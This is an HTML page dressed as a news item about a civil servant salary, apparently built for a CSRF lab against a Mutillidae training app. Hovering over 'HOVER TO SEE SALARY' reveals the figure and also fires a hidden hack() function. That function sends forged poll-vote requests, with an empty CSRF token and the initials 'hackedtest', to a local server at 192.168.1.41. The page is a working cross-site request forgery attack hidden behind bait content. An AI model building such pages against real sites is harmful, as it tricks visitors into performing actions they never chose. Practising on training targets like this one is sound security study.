<html>

<body class="hoverEffect">
    <div class="wrapper">
        <div class="buttonWrapper">
            <button type="submit" onclick="returnHome()">Return to Home Page</button>

        </div>

        <img src="./news3.jpeg" alt="news-image" />
        <h1 class="title">RAISE NEWS!</h1>
        <div class="newsDetail">The government announced the civil servant salary as&nbsp;
            <span id="hoverToSee" class="hoverToSee">HOVER TO SEE SALARY</span>
            <span id="salary" class="salary">22000 TL.</span>
        </div>
    </div>
    <script>
        const hiddenPart = document.getElementById('hoverToSee')
        const salaryPart = document.getElementById('salaryPart')

        hiddenPart.addEventListener("mouseover", (event) => {
            hiddenPart.style.display = "none";
            salary.style.display = "block";
            hack();
        });

        function hack() {
            fetch("http://192.168.1.41/mutillidae/index.php?page=user-poll.php&csrf-token=&" +
                "choice=nmap&initials=hackedtest&user-poll-php-submit-button=Submit+Vote",
                {
                    method: "POST",
                });
            fetch("http://192.168.1.41/mutillidae/index.php?page=user-poll.php&csrf-token=&" +
                "choice=tcpdump&initials=hackedtest&user-poll-php-submit-button=Submit+Vote",
            );
        }

        const returnHome = () => {
            location.assign('http://localhost:3000/index.php');
        };
    </script>

    <style>
        html {
            display: flex;
            justify-content: center;
            align-items: center;
            background: linear-gradient(#56CCF2, #2F80ED);

        }

        img {
            height: 500px;
            width: 850px;
            border-radius: 1rem;
        }

        button {
            color: black;
            border-radius: 1rem;
            height: 2rem;
            background-color: white;
        }

        button:hover {
            cursor: pointer;
        }

        .buttonWrapper {
            width: 100%;
            margin-bottom: 1rem;

        }

        .wrapper {
            height: 90vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }

        .title {
            font-size: 2.5rem;
            margin-top: 4rem;
        }

        .newsDetail {
            font-size: 1.5rem;
            display: flex;
        }

        .salary {
            display: none;
            font-weight: 700;
        }

        .hoverToSee {
            text-decoration: underline;
            font-style: italic;
            font-weight: 700;
        }

        .hoverToSee:hover {
            cursor: pointer;
        }
    </style>
</body>

</html>